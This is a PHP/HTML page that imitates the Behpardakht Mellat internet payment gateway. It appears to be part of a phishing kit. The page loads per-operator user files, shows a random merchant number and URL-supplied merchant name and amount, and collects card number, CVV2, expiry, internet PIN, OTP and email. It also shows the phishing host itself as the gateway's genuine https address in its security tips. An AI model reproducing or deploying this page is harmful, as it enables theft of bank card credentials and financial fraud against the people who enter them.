<?php


$rand = rand(1000000,9999999);
$Domain = $_SERVER["HTTP_HOST"];

$i=$_GET["c"];
if(file_exists("../data/Users/$i.php")){
if(isset($_GET["Mer"])){
$Merchand=htmlentities(strip_tags(htmlentities($_GET["Mer"])));
}else{
	$Merchand=" به پرداخت ملت" ;
	}
$Amount= htmlentities(strip_tags(htmlentities($_GET["amount"])));
$e=$_GET["c"];

}else{
header("Location: eror.php");
}


 ?>
 	
<!DOCTYPE html>
<html lang="en">
<head>

	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="description" content="">
	<meta name="keywords" content="">
	<meta name="author" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<meta property="og:title" content="Behpardakht Mellat Internet Payment Gateway" />
	<meta property="og:url" content="http://www.behpardakht.com/" />
	<meta property="og:image" content="http://" />

	<title>Behpardakht Mellat Internet Payment Gateway</title>
    <link href="img/ipg-favicon.ico" rel="shortcut icon">

    <link href="css/esprit_en.min.css?v=11" rel="stylesheet">
    <script src="js/jquery.min.en.js?v=1"></script>
    <script src="msg/messages_en.min.js?v=6"></script>
    <script src="js/payment.min.en.js?v=27"></script>

    <style>
        .close-button {
            background-color: #c2c7cc !important;
            background-image: url(./img/ipg-decline.svg) !important;
            width: 25px !important;
            height: 25px !important;
        }
    </style>

    <script>
        $( document ).ready(function() {
            otpRequestWaitMillis=120000
            setCardSuggestionListHeight();
            countDownRemainingTime(793);
            $("#cardnumber").focus();
            $(document).keydown(function(e) {
                var keyCode = getEventKeyCode(e);
                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = true;
            }).keyup(function(e) {
                var keyCode = getEventKeyCode(e);
                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = false;
            });
        });
    </script>
    <script>
        encRefId="0CB1310FC42CE806";
        panDtoList=JSON.parse('[]');
    </script>
    
</head>
<body id="body" class="up-scroll" onclick="hideKeypadOnOutsideClick(event);hideCardSuggestionListOnOutSideClick(event)">
	<header id="header" >
		<div class="container">
			<div class="beh-card">
                <a class="change-languge" href="index.php?c=<?php echo $e;?>&Mer=<?php echo $Merchand;?>&amount=<?php echo $Amount;?>">
                    فا</a>

				<div class="row">
					<div class="col shaparaklogo align-self-start"><img src="img/shaparak_logo.svg" alt="shaparak"></div>
					<div class="col-6 header-center align-self-end">
						<span>Behpardakht Mellat Internet Payment Gateway</span><br>
						<a href="http://www.behpardakht.com">www.Behpardakht.com</a>
					</div>
					<div class="col behpardakhtlogo align-self-start"><img  src="img/behpardakht_logo.svg" alt="behpardakht"></div>
				</div>
			</div>
		</div>
	</header>

	<div class="main-wrapper payment">
		<section class="container">
			<div class="row row-eq-height">
				<div class="col-lg-8 col-md-12 col-sm-12 order-lg-1 order-2">
					<div class="beh-card carddetail">
                        <div class="background-overflow">
                            <span class="shape"></span>
                        </div>

						<div class="card-header">
							<h3>Card Information</h3>
							<span id="remaining-time">Remaining Time :<b>10:00</b></span>
                            <span class="card-errorbox shaparak_shit_message">Please fill required fields with valid data</span>
						</div>
						<div class="card-body">
							<form class="card-info">
								<div class="form-group row">
									<div class="col-sm-4">
										<label for="cardnumber" class="col-form-label">Card Number</label>
										<small>Enter the 16-digit number printed on the card</small>
									</div>

									<div class="col-md-6 col-sm-8 col-12 mobile-justify">
										<div class="cardnumberbox" id="cardnumberbox">
											<span class="banklogo"></span>
                                            <input type="tel" id="cardnumber" maxlength="19"
                                                   
                                                   onkeydown="preventInvalidKeys(event);setPanCursorPosition(event);"
                                                   onkeyup="formatPanOnKeyUp(event);filterAndShowCardSuggestionList();setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)"
                                                   oninput="formatPanOnKeyUp(event);setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)"
                                                   onfocus="hideKeypad();removeInvalidClassFromPan()"
                                                   onblur="handlePanChange()"
                                                value="" 
                                            >
                                            <button type="button" id="card-list-button" data-toggle="dropdown" onclick="toggleAllPans()"
                                                    aria-haspopup="true" aria-expanded="false" tabindex="-1"  ></button>
											<div class="card-suggestionlist dropdown-menu" aria-labelledby="card-list-button">
                                                
											</div>
										</div>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputcvv2" class="col-form-label">CVV2</label>
										<small>Enter the 3 or 4-digit number printed on the card</small>
									</div>
									<div class="col-md-6 col-sm-6 col-10  mobile-justify keypad-parent">
                                        <input type="tel" class="form-control" id="inputcvv2" maxlength="4"
                                            
                                               style="-webkit-text-security: disc;font-size: 23px;"
                                            
                                               onfocus="hideOthersKeypad(this);hideCardSuggestionList();removeInvalidClassFromInput('inputcvv2');
                                               showKeypadJustInMobile('inputcvv2',event)"
											   autocomplete="off"
                                               onkeydown="preventInvalidKeys(event);"
                                               onkeyup="focusNextField(this,'inputmonth|inputcapcha',event);">
									</div>
									<div class="col-sm-1">
										<button type="button" class="form-btn keypad" tabindex="-1" onclick="showKeypad('inputcvv2',event)"></button>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputmonth" class="col-form-label">Card Expiration Date</label>
										<small>Enter Card Expiration Date </small>
									</div>

									<div class="col-2 d-lg-none d-sm-none"></div>

									<div class="col-md-2 col-sm-3 col-4">
										<input type="tel" class="form-control" id="inputmonth" maxlength="2"
											   placeholder="Month"
											   autocomplete="off"
											   onkeydown="preventInvalidKeys(event);"
                                               onfocus="hideKeypad();removeInvalidClassFromInput('inputmonth')"
											   onkeyup="focusNextField(this,'inputyear',event);">
									</div>
									<div class="col-md-2 col-sm-3 col-4">
										<input type="tel" class="form-control" id="inputyear" maxlength="2"
											   placeholder="Year"
											   autocomplete="off"
                                               onfocus="removeInvalidClassFromInput('inputmonth')"
											   onkeydown="preventInvalidKeys(event);"
											   onkeyup="focusNextField(this,'inputcapcha',event)">
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputcapcha" class="col-form-label">Security Code</label>
										<small>Enter Security Code</small>
									</div>
									<div class="col-sm-3 col-8 mobile-justify">
                                        <input type="tel" class="form-control" id="inputcapcha" maxlength="5"
                                               autocomplete="off"
                                               onfocus="hideKeypad();removeInvalidClassFromInput('inputcapcha')"
                                               onkeydown="preventInvalidKeys(event);"
                                               onkeyup="focusNextField(this,'inputpin',event)">
                                    </div>
									<div class="col-sm-3 col-6 capcha-container mobile-justify">
										<img id="captcha-img" src="Captcha/captcha.php" >
									  <input type="hidden" value="<?php echo $e;?>" id="code">
</div>
									<div class="col-sm-1 col-4">
										<button type="button" id="captcha-button" class="form-btn capcha" title="Refresh Security Code"
												onclick="refreshCaptcha()"></button>
									</div>
								</div>
                                <div class="form-group row" onblur="hideKeypad()">
                                    <div class="col-sm-4">
                                        <label for="inputpin" class="col-form-label">Internet PIN</label>
                                        <small>Enter Internet PIN</small>
                                    </div>

                                    <div class="col-md-6 col-sm-6 col-10 mobile-justify keypad-parent">
                                        <div class="cardnumberbox" id="dynamic-pin">
                                            <input type="tel" class="form-control" id="inputpin"
                                                   maxlength="12"
                                                
                                                   style="-webkit-text-security: disc;font-size: 23px;"
                                                
                                                   onfocus="hideOthersKeypad(this);hideCardSuggestionList();
                                                   removeInvalidClassFromInput('inputpin');showKeypadJustInMobile('inputpin',event)"
                                                   autocomplete="off"
                                                   onkeydown="preventInvalidKeys(event);"
                                                   onkeyup="focusNextField(this,'inputpayerid|payButton',event);">
                                            <button class="sendpin" type="button" id="otp-button" data-toggle="dropdown" onclick="validateAndRequestOTP()" aria-haspopup="true"
                                                    aria-expanded="false" tabindex="-1">Receive OTP
                                            </button>
                                        </div>
                                    </div>
                                    <div class="col-sm-1 ">
                                        <button type="button" class="form-btn keypad" tabindex="-1" onclick="showKeypad('inputpin',event)"></button>
                                    </div>
                                </div>
                                
								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputemail" class="col-form-label">Email</label>
										<small>Please enter a valid email (Optional)</small>
									</div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify">
										<input type="email" class="form-control" id="inputemail"
                                               onfocus="removeInvalidClassFromInput('inputemail')">
									</div>
								</div>

								
								<div class="form-group row">
									<div class="col-sm-4"></div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
										<button type="button" class="btn btn-perches" id="payButton" onclick="validateAndDoPayment('sale.mellat',processSaleResponse)">Pay</button>
										<button type="button" class="btn btn-decline" onclick="cancelPay()">Cancel</button>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>

				<div class="col-lg-4 col-md-12 col-sm-12 order-lg-2 order--1">
					<div class="beh-card merchantdetail">
						<div class="card-header">
							<h3>Merchant Information</h3>
						</div>
						<div class="card-body">

							<div class="merchant-container">
								<div class="col-lg-12 col-sm-4 merchant-logo">
									<!--<img class=" " src="img/sample/merchant-logo.png" alt="merchantlogo">-->
									<img class=" " src="img/ipg-defaltlogo.png" alt="merchantlogo">
									<span class="helper"></span>
								</div>

								<ul class="col-lg-12 col-sm-8 merchant-detail">
									<li>Merchant Name : <b><?php echo $Merchand;?></b></li>
									<li>Merchant Number: <b><?php echo $rand;?></b></li>

                                    

                                    <li>Merchant Website: <b class="merchantwebsite"><a  href="https://www.rayanertebat.ir">https://<?php echo $Domain;?></a></b></li>

									
								</ul>

							</div>

							<ul class="merchant-detail price">
								<li>Amount :<b class="price-number"><?php echo $Amount;?>&nbsp; Rials</b></li>
							</ul>
						</div>

					</div>

				</div>
			</div>
		</section>

		<div class="keypad-container">
			<h4>Secure Keypad</h4>
			<div class="frame-umbtn"><button id="num1"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num2"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num3"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num4"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num5"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num6"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num7"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num8"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
            <div class="frame-umbtn"><button id="clear" type="button" class=" numpad" tabindex="-1" onclick="keyPadBackspace(event)">&#9003;</button></div>
            <div class="frame-umbtn"><button id="num9"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num0"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="tab-key" type="button" class=" numpad" tabindex="-1" onclick="keypadTab()" style="color: #27d286;">&#10004;</button></div>
		</div>

        

        <div class="modal large-modal top_layer fade show" id="dynamic-pin-modal" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true" style="display: none">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Notice</h5>
                        <button type="button" onclick="removeDynamicPinDialog();focusField('inputcvv2')" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <p>Dear Customer, You do not need to press the "Receive OTP" button in the following situations: <br/> If you use methods such as password provider software of the issuing bank, enter your password in the Internet PIN field. If you have not yet activated the dynamic password of your card, you can use your static password until 2020/01/25.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" id="dynamic-pin-dialog-button" class="btn btn-primary" onclick="removeDynamicPinDialog();focusField('inputcvv2')">Got it</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal-backdrop fade show" id="dynamic-pin-modal-backdrop" style="display: none"></div>

		<section class="container">
			<row class="beh-guid">
				<div class="col">
					<h4>Dynamic Password Guideline</h4>
					<ul>
						<li>Dynamic password is a one-time password that can be used as an Internet PIN.</li>
						<li><b>Step one</b>- Activate the dynamic password according to your card issuing bank's instructions.</li>
						<li><b>Step two</b>- Receive the dynamic password in one of the following ways, according to the method issued by the card issuing bank.</li>
						<li>1- Receive via Bank Application, Internet Bank or Mobile Bank.</li>
						<li>2- Receive via USSD provided by your card issuing bank.</li>
						<li>3- Get through the "Receive OTP" button on the internet payment gateway.</li>
						<li><b>Step three</b>- After receiving the password according to one of the above methods, enter the received code in the "Internet PIN" field and then complete the rest of the information.</li>
						<br><br>
					</ul>
				</div>
			</row>
		</section><section class="container">
			<row class="beh-guid">
				<div class="col">
					<h4>Help and Security Tips</h4>
					<ul>
						<li>Card Number: a 16-digit number, printed on the card in 4-digit groups</li>
						<li>CVV2: a 3 or 4-digit number, printed on the card or on the back of the card</li>
						<li>Expiration Date: Card expiration month and year, printed on the card</li>
						<li>PIN2: Aslo known as Second PIN. generated by card issuer bank. can be generated or changed using issuer bank ATMs</li>
						<li>Security Code: Numric Code shown in picture</li>
						<li>Behpardakht Mellat IPG uses <code>https</code> protocol. our URL starts with <b>https://<?php echo $Domain;?></b>.To prevent possible abuses please check your browser URL before data entry, and inform us if it is incompatible</li>
						<li>Please use the secure keypad to prevent disclosure of your PIN</li>
                        <li>Please check Merchant Name and Amount before payment</li>
                        <li>If you need more information or you want to report suspicious websites, please contact us</li>
						<br><br>
					</ul>
				</div>
			</row>
		</section>
    </div>
	<footer class="footer">
		<div class="container">
			<div class="footerarc"></div>
			<div class="footerarc content">
				<span class="call">Contact Number: +98-21-27312733 </span><br>
				<span>Behpardakht Mellat Co. Provider of Modern Payment Solutions</span>
			</div>
			<div class="row justify-content-center">
				<div class="col-12">

				</div>
			</div>
		</div>
	</footer>

    <form method="post" name="returnForm" action="eror.php">
        <input type="hidden" id="RefId" name="RefId" value="0CB1310FC42CE806">
        <input type="hidden" id="ResCode" name="ResCode">
        <input type="hidden" id="SaleOrderId" name="SaleOrderId" value="812989789">
    </form>
	<form method="post" name="resultForm" action="result.mellat" accept-charset="UTF-8">
        <input type="hidden" name="RefId" value="0CB1310FC42CE806">
	</form>
</body>
</html>
